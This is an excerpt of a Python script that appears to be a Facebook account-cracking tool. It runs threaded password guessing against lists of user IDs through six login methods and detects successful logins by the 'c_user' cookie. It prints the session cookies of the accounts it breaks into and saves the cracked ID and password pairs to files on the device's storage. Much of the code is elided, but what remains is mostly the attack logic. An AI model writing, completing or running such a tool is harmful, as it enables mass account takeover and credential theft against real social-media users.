...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/ZOROX-XD/XD/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
def mozart():
    ...
    aryan = input("✓CHOOSE>")
    if aryan =='1':mozart1()
    elif aryan =='2':mozart2()
    elif aryan =='3':mozart3()
    elif aryan =='4':mozart4()
    elif aryan =='5':mozart5()
    elif aryan =='6':mozart6()
    elif aryan =='7':os.system("xdg-open ")
    else:
...
def mozart1():
	...
	print("[+]==============================================")
	mozartlovesyou = input("[+] [CHOOSE] :- ")
	if mozartlovesyou in ['y','Y','1','yes','YES','Yes']:
		mozart_xd.append('y')
	else:
		mozart_xd.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	mozarttop = input("[+] [CHOOSE] :- ")
	if mozarttop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{mozartfire}')
		...
		for guru in user:
			...
			if mozartfire =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif mozartfire =='2':yaari.submit(p,uid,pwx,tl)
			elif mozartfire =='3':yaari.submit(x,uid,pwx,tl)
			elif mozartfire =='4':yaari.submit(mobile,uid,pwx,tl)
			elif mozartfire =='5':yaari.submit(freeq,uid,pwx,tl)
			elif mozartfire =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in MXS-OK.txt,MXS-CP.txt')
...
def mozart5():
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if mozartfire =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif mozartfire =='2':manshera.submit(p,uid,pwx,tl)
			elif mozartfire =='3':manshera.submit(x,uid,pwx,tl)
			elif mozartfire =='4':manshera.submit(mobile,uid,pwx,tl)
			elif mozartfire =='5':manshera.submit(freeq,uid,pwx,tl)
			elif mozartfire =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[MXS-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in mozart_xd:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/MXS-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[MXS-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/MXS-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/MXS-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-MXS] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-MXS] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-MXS] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-MXS] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-MXS] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-MXS] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
